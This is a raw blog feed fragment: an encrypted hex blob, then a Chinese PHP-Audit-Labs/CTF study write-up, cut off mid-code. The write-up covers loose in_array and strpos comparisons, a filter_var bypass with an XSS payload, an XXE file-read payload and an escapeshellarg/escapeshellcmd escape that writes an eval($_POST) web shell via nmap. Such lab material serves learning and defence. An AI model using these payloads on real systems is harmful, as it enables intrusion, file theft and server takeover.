9f62c7300706ee3c395bb1be08bc85c0fb18cb2dce07ed04c713bec23536568c06755794d230d79d7fdff03298a709bb8d02ffc4bc02784f04cc958e8f1e514671800b13ac37d360b18dc4a9a1b0b294a2f5673de140b9935938d8d0731cd9e96d8a730d5c2b03b1e0a42d02178772857c60ba04fe198d6b021da0992e784db38c56fb382b3bd235ada323d995fb2433db10dbee6e19bfd3f13079b0634666ccc98be8e24db967c3ec053bbe003ab703164daa685cd7ecb6a99a0bee08de134e8e288d5fe440e44698fd5061b5639ab1c98904dcc2d159602a2ce60ba145aa2535a9976de8b2bbfddb3bb0f6d8048068485378209b0a90f79e2a1e3976bb6549fbd7728300f0726825cae4ec4b42ed431e8156aba881024e5169d0f19baabcaf6b22032f8853846344e4ccf68dd9a7dbb17079821f0fcd59fdd6455d67f0c5b84f1d4f945d223231b81c0a919970dc1b22af725d0d072134c32a9d2da1f18d8e31b48448b81bc255b20889e7940659aee8d1977a21a742019236baf872f643dc69b8479cf020c1a0d827555d9cb5c6f04ea23dc490eebeceea1fa8968134bc668fb3362d48ee62887a9ce04234c4b94a8010af80c911c30cabfd34281e327501b764bcb015b2eff209d50417574f32d4f2a6c77f42cdfc06f04538fea454b7ab030894b40893292d4e85c044a05a242870013eb9b1e376f501e0fa306a608643715dba35630e1a61fd9792ebddc85dd561644a90551d82848c9442728fe99a26cbb30f353d0186506ad62b3f4f0e029a119ecb221dd62a9392ee1ccc0aa97e8ed3ad09ae73b39b2127510f8c310d4e054c40d806d6cdbabb8796464a3d4e63775bf1058ecf807cef1a633493654a18078a1d3b705dafaa61297c7f8e4211604e7e556a81e86f03104527db167aa96cf616653f7779d755f47206b9901f829e442f71642050eb536a0c471b6211edefb4c4c627f1adfadbb714832561367e11f62f4b57ab86501a22343a60c7e4dd7fae58684a18970275d44bade1c80a3f396cd4e2aa5da9fa3eabd96410bbcd5d09b958be0600028f0072dca64696bad34c9a8a9642fe88482f2323b7c206a589c0ba7dc86b6e99a5921eba08e250ac5215dd7bcc009e2f32602d67900885fb106bb87dc6a8d16f6ce451ef0b13b0ba6e1e9c32e6885e37bfe63117c107b4b9239de8a6602095805c9dec8ec7fe8a7666a18b8267600db39fe8e31a7d0ab30d7172f18532f02c13cd44a1b3bdece134026f7fe715a48d4b962d4f0a631523be93c5fff2f2b71c7c746f096b8016d848afc3c16c16bd7381501824ee455eccb91c7c2b6c80b43489ecf479166e1e40b26198259cc5aacca8e8a0c7c7fa805641f85b4782a01947bc2a5d95c22e8fafe23930842e398d17048869f33e5e5e316580f5bd6c9ac5f6bb8e439ff3c554ec4e26798ef088409b50e105d4bf819d87d399e60e5ed692ca7b2f94c8429f5cc064c4d4fa8f39787ca83d0c147d014dd3c48504cebfdd0b903307cd0a4c2feff37c77fc5ebe4d3ed73e28028d974368fb86784f47183794eeb2c5d878dba527fe2f1dbae7e793e921d3a4d42eb8ad801a17381a3c3b25443ad7b295c80529557b35f08c372b7f511e9c0aebb9d4bb9c61df3363a9b18ab0148bdcb57c92e8318b2ee202249523b84a7c855f2584cc2e31dbe031e0b4c2acbed862bf75814e66e0c5b9daad322502abe67688bf854a6c0150a91699c1b4fcdaab3833a1a9bc6e90547c1b5bc73a5e89aa7071172f1b23a8498bb6a28cb7c1ebf7eb91633f035cdea035df946d1f0eb0ebfdeecc78b0cdafcb4c8cae64eb2337bec01e1a3e479a15f32288bb87120d6b23042cd35446126d259c96c106f00d54151c49478ddea48139c752b3aeb41a51ca6f92c8e00c959ff928065ecdfd89c6896df29896823051933ba006bfddcc434b297d2e63614afa5e2aa6f73e4c31ce3674e4e4e436b2d9dd1d7cedee54dce6a47972cd44d12de519d95f9720df9c1be4eb98e9a7a1292466eb65e54655479d174d84673aa47318e46752a219b995e5f120b5749ec29fcf13d0493648f29c0da9d6707372b56be394c2ac2e9a507c46b95ab582e21df0a9f5e857ad60a6005e8983f19d9606e8ae6cfc0bf87915a412634a290c237b74d86accf70ca5c781d6f026d83e6ce3827c27672d7cd6659f4f8635495fa32c2a4e09d99be21b22d16784b89869c84b75250463b11eb4fd0f8d7c3e0f5c1b1aabc6537bb8aa683406787cbcedc6364eb2858630ef2efb24f39aed1569906c5215eb49cc88689dccd00f3af012dcb6e1c1e0c71206ad2b882a5a5439e6f3647fbc3da4965e4cd5adef8bf0c20563ad268b2548b709473efaae9d2a898c0d4d8d37298b09ee90dcee8a8a29ec285161e35cff447da4834865c84505bbe509f8f25522aba699411f4c0d7024ee61ed11861e16df658bc7291a655b9904beafe4fc8fd1ba61aca13a055cbe1bd7b3a7bb8fa81a82005348f56582258adb8080daa8e9ef4c4a848cadfd678a6a107028cd56a58b5c1ed3eb1778e09df0a92f7d6cc8ab828610982c5b9f81a526b29ee7c28b913a17e40a088cec066d92a0adaa0f29294a3f3fbb94e1fdfb2280272a8199cdbb7d52083242e28668f306785ddc0b5d91ff802ff8e5737a0b86361bd093e07b613e296676e3409ab1edcdb312b9fc4b7f10053b854aaf2fe1ecd54eaaac3d9f67cb459052922638ffdb7d23b7dd29f5c397975b035c7ce5f5c3795d3525f248528361bb67312c50b2dfb998bc9befb46a43fb6ae2cf3359c7a28898803bbac22b7db224fcc627fb96056eea2dcbfd0d7aedfabf1f8150b35e04aaeebdfbd83622d38628d7128b2ccf0b45ee233f62dcc9651e6995e30c6c73ccb8cf04eec8741ec6fc803bbae75c494dc3a105f7bd3f43e9250737f91692cbadd3f7de20a52e697cf6a32399d14643cd333c331a083f33cc3d430be1d7152b0e77f67640f8c141b484ab8fefb5b3c5a73cf557159b83317bd678a56a5b3cbe80b1dd5d702cc6e3206449a31c465d79f0f0e0bba10c45dd430c8de8ba28b806acd70f06f4888379b7743ba1eb586a45df5fa4fb3900e6946b69ac92b533bec05e705a797e6dcaaf1c090ff249b5483aed6f91f15dc38f0595bbca858dcaa806fe1706e99074ddc496c7afff7fb8958239a72312e98a300c49d51841a403bb4a15b19ba67ed6b4863544b39b0dfb029bd910ad372ccc409b7925ceeebfcf31261560cc68317a2ea7afa2195be1491f537d3bd650a1a291b9797e3296881b09bb156c673b25039c3d188c4c9a3ba0418c34a2d3458f24cc882650914f45c4cc2a95cc49d3bb0926449fb5d8a2284162bc20e04cb881228e906ddf6f50d54c612609a89134942dfeb0fccf69a5889a1956e587b01f4708a0b2360a3bcbce610319ec41e15e6f9992bd49cd5d68710f5a1255a4648b4b33145483b9cefdb0d915bdbd9e2cee8dc57d62f46e2d8568cff649aac4cf5c618252c9b31a1c2f72689e60789404b2ccab78707009143701d15eee56fa470e5ae811b650e9c19ffc82f498069ec8a082a5d7e2c6b6ef26981722495e15bd80fb3c79c05e4b97c269f5abff959eb4499e7bd041d48a7ff4bbdc732a74d0b410d2d4424f7e27457c6f864a5314dbbe28c4fa0d50a293527b000348654954a56b2e6607fc1de34f996c1aeddd5211da0c11b6a621cc641ef6c1946f094cf2680151d6e12226e5b0d67408578e186aba14a9558b97dc2a5ecc7d24457d8c0d6139ae53c0b021d71fe6bb1b0f8a59fffcf57318f5c4ece1ca324e5585ba533998ccfa8adf6c69792a90fb989abda32c1cbf6912c0d98749b8e48f60be4c6f83af931a2d741555a098a2e94976f4dc82f5b4983bf16a37d1a0e2b282da5a137be914db0e9996e8a85eb5d56addb2b8786a81ff8c6bfbc07cd1ef2d5f21be10376495c2eb1cb405a4c9a7692f8a282dc9de5e34d018bbdb066359aeb67a044d712363e39333ffb0183c8d7d415a01fff05e3e4e62644eb5e689a8d642e6f7f6bdc6178270d84c8f491375cfe640e6f0f36f3a90c14ef6df247fff9c6cbdbf76b2078737a4669d1fd1f55694ba90e7d57e9ff337fe8f5d157a8ea22b0ad654198fc7abfb04db7489367a443e40d46a1fcc8091585bf3b2792941ff3b8dc02697d026250860ae93345dce808c4c41fea63c32a05e677c7349abb531619afe6de519d6b994eb9f892cdbde9c4c9b1107c45c4773470054550b25a5efd360082c0cc0ac095b51abd7e5a7fe41d3437e16634a47f4d89f920766fc7c003243959094b294fec54e1442cb3c02a0cbec8b5b5b48c2a2eb69ac1e25943ce95526239e031d2cd717424ba7b3e481a714c03ee0d95fea3764b41482e9aa39f78a273429fbf0c45d7ac097cda4a341e84c83e723368a636b9146b0748dd2b52ec73abea26bfba05d05a5d1b6e83bf3d572dd3aa559297ef5fc9bfe7218035de0fc5f7cd0f18b1a4aba04ba7b79a5cb8691c1e22d00dbbf20b1ee6c7c21a568d3f61d9a04d6a244a2ea3bdeab684ef9050b0043e9640fd3db9cef05e5ca9e6dfb0c3741bb8494935562dc2f5b13f559706547838683b9f92f42fa0a079d58da4d8fad096589f983b972147b423dc3d2c6ad9347775abf90dcba01a7707803e27ea4bec5deb218d6fc707472c5d47d53b06cf22f4689ac5d131b38157a96cbd7e83c7c4e95f8c0bf0238e9ce869a9422f315443527164e47fbfaae0ab9580c2fcda426ec0d25b57bc9ffa22daf87b79a4970aad0ae4107174beb75bcb405da43eb19c36b4059fb6071150167aa8b27db4f21370898a5a5be7965b6d20d63cc46f132631fbd2edbe85c4c4d418d319e4b723fc884c1cc3a5bdce32db084ea40ccdfebde8ae1bfa9011c53f2179bd82575332a71250c378bfbd63bb2760fd893d1ab4e12b4d9744bb96283b2dc48e1169feb8fef1ca0a770a5b7f7f4f4289e550f8a214dd7b759a827f8898c5639b96e139098a5b477f1f73e8b3e13fc72ad96b9529048079bd2f888ad82953b7636a6e8a83e974a0ca15d9d414ddf9eaafd49ef1fb3c756fa7385c6c53066bf1f296656c9467989a3fa0b5fdb50a48b2034be6302bc8a1b34ead5dc6a090a27903e37e580a9178f0a884042fee45b3f905f879841b2bd4cce918027bc9af853d820f8533a8c2361572837f23f54d9ad4d7375d86a0fd909624921c15fd6c8b6493517fafebbb47fc5dd873a6850f49ff428b3456844bdf4ca4188a7b0c4b3cc531710e654fea7aef1d35c9af9d5ceac45c04434f999ea351c62b4cd99556a6fc6de3265d39c7c814adb935fc88cdeb171da3cc57592f106f8a0ac02312c3504c8a5b37758a2fd3291ad907716aab8afaa7bb57406bbfe4ead65144ea11f922615c9d1aebec3731151f08a91d7059963bb9d1ea5fb29434494e9300db1172973d4ce5e9103d68174dd1583e059a9da91530a6c560055bf9292f9b22f9623c4b979850c850bb4f61a3f299eb7ed18c20d05c7e4a8fd9c42fe2559619d7117aebf23756f2fd7dc883c74e7a4d8d8abaa504bb1e0ca5333530e08a7669414de5188ef32803bd5a25010b33b2207f15a978fe04b954386b3a7c77a8e2b2640e540da0b79534ac34efc2072597c80aa54536e151a6e3a7e33f70c767c81eb080d28a9b312331b576053e2154ab2d9a21506c733125f7c7bc7ed05110704fbb591b436006b6c4fe5e63f720f6f0ca9012245199ce1ff8c2cc20a5351164b8f3ae7949284741b57846e2e9d3dc3e9ef36b8ef44b34b37645f36b8273cd9dc9f93e27104c7e421cb769540baeee774db937b398df83165684383ab197c682d535406037f92b7902ff999e30046b691ea7334d5cc574e121ee6cec06b95b2573a8dbdb90d8b2a342860f376a26d0b73f5d27b1c21dfe5286cb009052a17c65f9b35811e5a08effdf4565ac7e7f30c5747ae80488d29380b514f719ea32408b81e65823838c595693c9bb2537ba3f2c59d477be5b0356d4c5d69762e5fa34a2cd6acdf72ca14fc1387a02ca952f1e148931f81e6835a5cbad8649e45c92b97b6532702ed74f511cf3cff2ad9a2388e64564b2d32229a5b0fc9bb9f0a957292e3245ed5d8fdf6b90068238f332f41cbb9bf8f330aa2134093f55658b888d591bcf04884e92c50ec64aa02136e3bc958320ff23e9b1b6fe96abd3702f6457effbcb139397879862b288c2a2ed2cc6de01b597e0eaf5438aa9a1e4fbddf6db45ed588f653d857b1b08a4b7b6eb9db797990f49e18905b212967c5d08f1fd13703e485ef619d200ed2231181dc0f02f7478f2c66a4b105e239479b519e0a27054a237395a0227cc867a6228dbab5d792c8efbc982f2f26e6866d12f9f190f1d2c1160b6eb7563db250795cc358ed417415e0eeec5d30f65dad97b85face85dfe4465626e429dc6d39dddd15289d1ffc17371134b52d7ca046a2eb5da266c37d1ed377e196baf11be4efb35a14fffda37ce478b2ee1d1769dffa5edc0ab013d9cb02d3e8a19a8724da6bbf53351141cc80dd8c8e48a5bf0cd739d4a96576c19f39c25d880d2bba5f9b2a531253e69c81b984b5af1c99a959c31d9ad04f89809bb126c307e431720b84ff0f7cd8e0854240b78532253077f1932943ad7f50a5a60d1c54ede362c405c4760815da1c7916f28bd737328ae4b3053d98f14f0c8c7babdfab5daa848ad21587ac50c2e1db8ddcdb0f5951ec167b0c723ebbe8f8ca535e772c2b8f7b073b5d6ca5f5caa6303cb2a219407f614cd3cd9e7e169d746c7e55b70c273eba1ca443afd90d14d6e85b1ab7b0a1f688f1950c2d9b4fd8f6aff25cda3d531955817a8f307e9be9d79f6943156f99fd04f8475ebe6737be77e8abed533c4be5d4f609a2a5b42671c99fb617f51849596923a6313158e1bead342a80d9b76facba2cc9dd43efdc9ba24d134e2402c5c60f94e2c35d91ac9bab6bee561bef3e3ed33ca70f9421374d8987f3f33dcc9116a4210f0ffaa559ce6e4d530189f1293a847a357badf938db0d3fc4da45a39460bddfa4d475eb18f93953ed17dd7b6ec9d0c6e0a9ea7434deae7a7059ea9dcb4c2ed3c83a3819a87baed3a22c677e32cc83e05a75005b1b199439555b92813a3b1ebb3379e7277af1b8a47c461c8a1434d74ceef72845edf761872b89daeea8158bfdf73c254dc2d821efcacaf9c904584f5113c034c77719d9d3eef9096a8b3d56491f9ff18738760b5f877a41dc9e5c82dc02a0dac236ed10097606c29f78425f23517eaaf7a5a1257f73b4bc2753b3d1d1c8e7bc9c7e69bd35310e9a4faf8f618a4a84f5d38b8e47079354bff79cec3cfbbb65bc2ef001cdf548c109fd7822553b2ee87bdbf0e9eda50a927eeee469cdb98b564c14cde43ead5df6a4bbd94499351d757bbe19fcacf47a0ed94477f9ab1b2da0b55ee5521190384c7e1027b92779196b7142684e531d680901c76c24ac00de5f5bd4c453e4b067f1d4b9d419d99b947609c7a1a44d5e78d6ec393ee2baff76a495b88979fc2c6f1c60ba2cce24feeefba51304c46a3be2753a6e5f1b65dcb910e9e566dbdddc4708bc2dbe6a682a2013d8a31209234da11cd36a2873e3e9407ef8943caf07549d3c152e09be2d5280111dce2362ab671453b556f5cec6a328c0700213e0f798bf444edc1311773e7237c445cf2c3a5753d26a54c98d37d485544b0464ad1bf9de8c6189f7236eda04218db20fe67f79745e0588482a7025238214af47887ddaf88f751aac1685d9dad8b0559b75f38b8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Python" scheme="https://da4er.top/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP-Audit-Labs练习 持续更新....</title>
    <link href="https://da4er.top/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-05T06:00:15.000Z</published>
    <updated>2020-03-10T10:45:23.269Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h4 id="in-array-函数漏洞"><a href="#in-array-函数漏洞" class="headerlink" title="in_array()函数漏洞"></a>in_array()函数漏洞</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><a id="more"></a><p>这个漏洞的关键在于第三个参数上，如果没设置为true就会出现问题。<br>题目给的代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><p>我们发现post传进去的rate参数，只使用了in_array函数进行过滤并且没有设置第三个参数为true。<br>那么我们传入<strong>rate=3shell.php</strong>的话，在使用in_array()进行检查的时候，会<strong>先把rate转换成3</strong>，然后在判断是否存在。这样就会绕过in_array检测机制。<br>测试代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><h5 id="1-使用intval强制转换成int类型"><a href="#1-使用intval强制转换成int类型" class="headerlink" title="1.使用intval强制转换成int类型"></a>1.使用intval强制转换成int类型</h5><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><p>这样即使我们输入的参数不合法，也会被强制转换为int类型，从而不会造成危害。</p><h5 id="2-将in-array函数的第三个参数设置为true"><a href="#2-将in-array函数的第三个参数设置为true" class="headerlink" title="2.将in_array函数的第三个参数设置为true"></a>2.将in_array函数的第三个参数设置为true</h5><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="Da4er"><p>这样在比较的时候，要求类型也要一样，从而不会绕过。</p><h4 id="CTF-Docker-题目"><a href="#CTF-Docker-题目" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h4><p>主要代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class title="Da4er"><p>在index.php页面，发现使用了in_array函数，但是没有加以限制，这就会造成这个函数的检测形如虚设。我们只需绕过stop_hack即可。<br>检查正则表达式发现没有过滤报错函数，我们可以进行报错注入得到flag。</p><hr><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h4 id="filter-var函数缺陷"><a href="#filter-var函数缺陷" class="headerlink" title="filter_var函数缺陷"></a>filter_var函数缺陷</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/13.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/14.png" class title="Da4er"><p>当第二个参数设置为上图的值，会检测第一个参数是否为正确的url。<br>这里是可以绕过的，一般可以使用：javascript:// file:// test://等绕过。<br>注意：javascript:// 中的//是注释符，当我们使用这个弹框时可以使用如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">javascript:&#x2F;&#x2F;comment％250aalert(1)</span><br><span class="line">其中的%250a&#x3D;&gt;%0a 是换行符的意思。</span><br></pre></td></tr></table></figure><p>测试代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/15.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/16.png" class title="Da4er"><p>发现这是可以绕过的。</p><h4 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h4><p>不光要使用filter_var进行过滤，还要使用其他的过滤的措施。<br>如下图，xss防御措施：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/17.png" class title="Da4er"><h4 id="CTF-Docker-题目-1"><a href="#CTF-Docker-题目-1" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/18.png" class title="Da4er"><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;||sec-redclub.com</span><br></pre></td></tr></table></figure><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/19.png" class title="Da4er"><hr><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="实例化任意对象漏洞"><a href="#实例化任意对象漏洞" class="headerlink" title="实例化任意对象漏洞"></a>实例化任意对象漏洞</h3><p><strong>实列化对象漏洞是:用户可以输入一个参数，作为对象名，输入任意个参数，作为对象的参数。如果没有对用户输入做严格限制就会导致这个漏洞。</strong><br>直接拿CTF题来演示，用到的函数如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/20.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/21.png" class title="Da4er"><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NotFound</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#39;404&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(</span><br><span class="line">    function ($class) &#123;</span><br><span class="line">        new NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$classname &#x3D; isset($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : null;</span><br><span class="line">$param &#x3D; isset($_GET[&#39;param&#39;]) ? $_GET[&#39;param&#39;] : null;</span><br><span class="line">$param2 &#x3D; isset($_GET[&#39;param2&#39;]) ? $_GET[&#39;param2&#39;] : null;</span><br><span class="line">if (class_exists($classname)) &#123;</span><br><span class="line">    $newclass &#x3D; new $classname($param, $param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    foreach ($newclass as $key &#x3D;&gt; $value)</span><br><span class="line">        echo $key . &#39;&#x3D;&gt;&#39; . $value . &#39;&lt;br&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>class_exists 函数来判断类是否存在，如果不存在的话，就会调用程序中的 __autoload 函数，但是这里没有 __autoload 函数，而是用 spl_autoload_register 注册了一个类似 __autoload 作用的函数，即这里输出404信息。<br>这个发现没有对用户输入进行限制，可以造成xxe任意文件读取漏洞。</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/22.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/23.png" class title="Da4er"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;GlobIterator&amp;param&#x3D;.&#x2F;*.php&amp;param2&#x3D;0</span><br></pre></td></tr></table></figure><p>最后payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;G:&#x2F;PHPstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;flag.txt&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;param2&#x3D;2</span><br></pre></td></tr></table></figure><p>这里注意的是：读取文件要使用php伪协议，因为：当文件中存在： &lt; &gt; &amp; ‘ “ 这5个符号时，会导致XML文件解析错误。<br>最后成功读取到文件。</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/24.png" class title="Da4er"><hr><h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><h3 id="strpos使用不当引发漏洞"><a href="#strpos使用不当引发漏洞" class="headerlink" title="strpos使用不当引发漏洞"></a>strpos使用不当引发漏洞</h3><p>说是strpos函数，其实就是程序员对一些php漏洞点理解不当而造成的。</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/25.png" class title="Da4er"><p>实列代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/26.png" class title="Da4er"><p>看到第8，9行，通过strpos函数检测$user和pass是否包含&lt;&gt;，但是这个有个忽略点：false 和 0 的取反均为 true 。<br>所以如果我们让$user或$pass开头包含&lt;，则返回的是true。<br>我们通过实列测试一下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/27.png" class title="Da4er"><p>发现即使字符串中包含&lt;&gt;也是可以进入判断体的，这就造成了绕过。</p><p>其实不光strpos函数，==号也存在这样的问题，==号出现的问题叫做弱类型比较。因为==号在比较时会先转换成相同的类型在比较，这就造成了绕过。<br>实列代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/28.png" class title="Da4er"><hr><h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><h3 id="escapeshellcmd与escapeshellarg"><a href="#escapeshellcmd与escapeshellarg" class="headerlink" title="escapeshellcmd与escapeshellarg"></a>escapeshellcmd与escapeshellarg</h3><p>作用范围：Linux<br>两个函数作用如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/29.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/30.png" class title="Da4er"><p>实列代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Create By Da4er.</span><br><span class="line"> *&#x2F;</span><br><span class="line">$shell_string &#x3D; &quot;&#39;&lt;?php phpinfo() ?&gt; -oG hack.php&#39;&quot;;</span><br><span class="line">$shell1 &#x3D; escapeshellarg($shell_string);</span><br><span class="line">$shell2 &#x3D; escapeshellcmd($shell1);</span><br><span class="line">echo $shell1.&quot;\n&quot;;</span><br><span class="line">echo $shell2.&quot;\n&quot;;</span><br></pre></td></tr></table></figure><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/31.png" class title="Da4er"><p>根据运行结果看出：先将字符串经过escapeshellarg转换成shell能识别的字符，在用escapeshellcmd对字符串进行转义，可以造成字符逃逸执行特殊命令。<br>官方解释如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/32.png" class title="Da4er"><h3 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h3><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/33.png" class title="Da4er"><p>题目对host参数用上述两个函数进行了过滤，可以逃逸出去。在结合nmap的命令可以写入shell到网站。<br>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</span><br></pre></td></tr></table></figure><p>-oG参数可以将前面的一句话写到hack.php中。</p><h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 